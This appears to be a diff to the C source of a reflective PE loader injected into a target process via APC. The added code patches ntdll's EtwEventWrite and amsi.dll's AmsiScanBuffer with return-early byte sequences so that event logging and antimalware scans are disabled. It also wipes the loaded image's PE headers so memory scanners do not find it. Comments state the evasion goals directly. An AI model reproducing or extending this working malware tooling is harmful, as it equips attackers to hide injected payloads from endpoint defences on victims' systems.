@@ -250,9 +250,14 @@ static inline __attribute__((always_inline)) DWORD _rl_hash_w_ci(const WORD *s, 
 #define RL_H_TLSALLOC              0x8BF55163u
 #define RL_H_TLSSETVALUE           0xC324EBA1u
 
-/* ntdll.dll — for RtlAddFunctionTable (forwarded from kernel32, so resolve directly) */
+/* ntdll.dll — for RtlAddFunctionTable and EtwEventWrite */
 #define RL_H_NTDLL                 0x22D3B5EDu
 #define RL_H_RTLADDFUNCTIONTABLE   0xBDB9F1AEu
+#define RL_H_ETWEVENTWRITE         0x24A8D022u
+
+/* amsi.dll — for AmsiScanBuffer patching */
+#define RL_H_AMSI                  0xDAF90FD9u
+#define RL_H_AMSISCANBUFFER        0x29FCD18Eu
 
 /* ═══════════════════════════════════════════════════════════════════
  *  PEB walk → find module by hash → resolve export by hash
@@ -372,6 +377,67 @@ static inline __attribute__((always_inline)) DWORD _rl_section_prot(DWORD chars)
 }
 
 /* ═══════════════════════════════════════════════════════════════════
+ *  Pre-loading evasion patches — run in child process BEFORE PE loads
+ *
+ *  These patches disable AMSI and ETW in the spawned child so that
+ *  LoadLibraryA calls during import resolution don't trigger scans,
+ *  and .NET CLR events aren't logged.
+ * ═══════════════════════════════════════════════════════════════════ */
+
+static inline __attribute__((always_inline)) void _rl_patch_etw(
+        fn_VirtualProtect pVP) {
+    /*
+     * Patch ntdll!EtwEventWrite to return 0 (SUCCESS) immediately.
+     * Prevents ETW tracing of assembly loads, CLR events, etc.
+     * x64 patch: xor rax,rax; ret → 48 33 C0 C3
+     */
+    PVOID pEtw = _rl_resolve(RL_H_NTDLL, RL_H_ETWEVENTWRITE);
+    if (!pEtw || !pVP) return;
+
+    BYTE patch[] = { 0x48, 0x33, 0xC0, 0xC3 };  /* xor rax, rax; ret */
+    DWORD oldProt = 0;
+    pVP(pEtw, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
+    BYTE *dst = (BYTE *)pEtw;
+    dst[0] = patch[0]; dst[1] = patch[1];
+    dst[2] = patch[2]; dst[3] = patch[3];
+    pVP(pEtw, sizeof(patch), oldProt, &oldProt);
+}
+
+static inline __attribute__((always_inline)) void _rl_patch_amsi(
+        fn_LoadLibraryA pLLA, fn_VirtualProtect pVP) {
+    /*
+     * Patch amsi.dll!AmsiScanBuffer to return E_INVALIDARG.
+     * x64 patch: mov eax, 0x80070057; ret → B8 57 00 07 80 C3
+     *
+     * We must LoadLibrary amsi.dll first — it may not be loaded yet in
+     * the child process. If it's not present, nothing to patch.
+     */
+    if (!pLLA || !pVP) return;
+
+    /* Build "amsi.dll" string on stack to avoid data section reference */
+    char amsiDll[9];
+    amsiDll[0] = 'a'; amsiDll[1] = 'm'; amsiDll[2] = 's'; amsiDll[3] = 'i';
+    amsiDll[4] = '.'; amsiDll[5] = 'd'; amsiDll[6] = 'l'; amsiDll[7] = 'l';
+    amsiDll[8] = '\0';
+
+    PVOID hAmsi = pLLA(amsiDll);
+    if (!hAmsi) return;  /* amsi.dll not available — nothing to patch */
+
+    /* Resolve AmsiScanBuffer via export table walk */
+    PVOID pAmsiBuf = _rl_resolve_export((BYTE *)hAmsi, RL_H_AMSISCANBUFFER);
+    if (!pAmsiBuf) return;
+
+    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+    DWORD oldProt = 0;
+    pVP(pAmsiBuf, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
+    BYTE *dst = (BYTE *)pAmsiBuf;
+    dst[0] = patch[0]; dst[1] = patch[1]; dst[2] = patch[2];
+    dst[3] = patch[3]; dst[4] = patch[4]; dst[5] = patch[5];
+    pVP(pAmsiBuf, sizeof(patch), oldProt, &oldProt);
+}
+
+
+/* ═══════════════════════════════════════════════════════════════════
  *  ENTRY POINT — called via APC in the target process
  *
  *  The injector prepends a 16-byte header before this code:
@@ -410,6 +476,16 @@ void reflective_loader_entry(QWORD apc_param) {
     fn_RtlAddFunctionTable pRtlAddFT = (fn_RtlAddFunctionTable)_rl_resolve(RL_H_NTDLL, RL_H_RTLADDFUNCTIONTABLE);
 
     if (!pVirtualAlloc || !pLoadLibraryA || !pGetProcAddress) return;
+
+    /* ── 1b. Patch ETW and AMSI BEFORE loading anything ──
+     *
+     * ETW: Prevents CLR and loader events from being logged.
+     * AMSI: Prevents AmsiScanBuffer from flagging loaded assemblies.
+     * Both must happen before LoadLibraryA calls in import resolution,
+     * as those trigger AMSI scans and ETW events in the child process.
+     */
+    _rl_patch_etw(pVirtualProtect);
+    _rl_patch_amsi(pLoadLibraryA, pVirtualProtect);
 
     /* ── 2. Parse PE headers ── */
     RL_DOS_HEADER *dos = (RL_DOS_HEADER *)peRaw;
@@ -598,12 +674,32 @@ void reflective_loader_entry(QWORD apc_param) {
         *(PVOID *)(peb + 0x10) = (PVOID)imageBase;
     }
 
-    /* ── 12. Flush instruction cache ── */
+    /* ── 12. Stomp PE headers — erase MZ/PE signature from memory ── */
+    {
+        /*
+         * Zero out the entire DOS header + NT headers + section table.
+         * Memory scanners look for MZ at the base of private RX regions;
+         * without it, the allocation looks like anonymous data.
+         *
+         * We keep sizeOfHeaders which covers DOS hdr + NT hdrs + section table.
+         * After this point we no longer need any header data.
+         */
+        DWORD hdrProt = 0;
+        if (pVirtualProtect) {
+            pVirtualProtect(imageBase, sizeOfHeaders, PAGE_READWRITE, &hdrProt);
+        }
+        _rl_memset(imageBase, 0, sizeOfHeaders);
+        if (pVirtualProtect && hdrProt) {
+            pVirtualProtect(imageBase, sizeOfHeaders, hdrProt, &hdrProt);
+        }
+    }
+
+    /* ── 13. Flush instruction cache ── */
     if (pFlushIC) {
         pFlushIC((HANDLE)-1, imageBase, sizeOfImage);
     }
 
-    /* ── 13. Call PE entry point ── */
+    /* ── 14. Call PE entry point ── */
     fn_Entry entry = (fn_Entry)(imageBase + entryRVA);
     entry();
 
